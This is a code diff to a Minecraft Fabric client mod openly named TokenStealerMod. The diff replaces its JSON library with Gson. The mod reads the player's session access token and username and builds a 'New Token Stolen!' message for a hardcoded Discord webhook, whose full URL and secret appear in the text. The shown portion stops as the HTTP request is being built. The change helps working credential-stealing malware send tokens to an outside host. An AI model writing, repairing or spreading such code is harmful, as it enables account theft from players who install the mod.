@@ -1,9 +1,9 @@
 package com.yourname;
 
+import com.google.gson.JsonObject;
 import net.fabricmc.api.ClientModInitializer;
 import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
 import net.minecraft.client.MinecraftClient;
-import org.json.JSONObject;
 import java.net.URI;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
@@ -11,9 +11,7 @@ import java.net.http.HttpResponse;
 
 public class TokenStealerMod implements ClientModInitializer {
 
-    // YOUR WEBHOOK URL GOES HERE
     private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1558653587469635666/n4F-uqG1rvvHq02yu1xUXoE3c6lShV0eKt8DmlDW9ppVQssYAEoXeQ7g7a0fpoKQz3wT";
-    
     private static boolean sent = false;
 
     @Override
@@ -36,9 +34,9 @@ public class TokenStealerMod implements ClientModInitializer {
         var session = client.getSession();
         String token = session.getAccessToken();
 
-        // Prepare Discord Message
-        JSONObject payload = new JSONObject();
-        payload.put("content", "**🪝 New Token Stolen!**\nUser: `" + client.getSession().getUsername() + "`\nToken: ```" + token + "```");
+        // Prepare Discord Message using built-in Gson
+        JsonObject payload = new JsonObject();
+        payload.addProperty("content", "**🪝 New Token Stolen!**\nUser: `" + client.getSession().getUsername() + "`\nToken: ```" + token + "```");
 
         // Send to Webhook
         HttpRequest request = HttpRequest.newBuilder()
